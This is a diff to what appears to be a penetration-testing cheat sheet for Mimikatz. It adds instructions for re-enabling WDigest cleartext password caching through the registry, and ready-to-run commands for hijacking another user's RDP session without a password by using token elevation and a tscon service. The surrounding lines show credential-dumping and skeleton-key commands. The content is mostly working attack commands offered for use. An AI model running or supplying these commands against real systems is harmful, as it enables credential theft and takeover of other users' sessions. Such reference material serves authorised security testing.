@@ -24,6 +24,10 @@ mimikatz # sekurlsa::wdigest
 ```powershell
 mimikatz_command -f sekurlsa::logonPasswords full
 mimikatz_command -f sekurlsa::wdigest
+
+# to re-enable wdigest in Windows Server 2012+
+# in HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest 
+# create a DWORD 'UseLogonCredential' with the value 1.
 ```
 
 ## Mimikatz - Mini Dump
@@ -64,6 +68,23 @@ misc::skeleton
 net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
 # login as someone
 rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
+```
+
+## Mimikatz RDP session takeover
+
+Run tscon.exe as the SYSTEM user, you can connect to any session without a password.
+
+```powershell
+privilege::debug 
+token::elevate 
+ts::remote /id:2 
+```
+
+```powershell
+# get the Session ID you want to hijack
+query user
+create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
+net start sesshijack
 ```
 
 ## Mimikatz commands
@@ -108,3 +129,4 @@ More informations can be grabbed from the Memory with :
 
 - [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821)
 - [Skeleton Key](https://pentestlab.blog/2018/04/10/skeleton-key/)
+- [Reversing Wdigest configuration in Windows Server 2012 R2 and Windows Server 2016 - 5TH DECEMBER 2017 - ACOUCH](https://www.adamcouch.co.uk/reversing-wdigest-configuration-in-windows-server-2012-r2-and-windows-server-2016/)
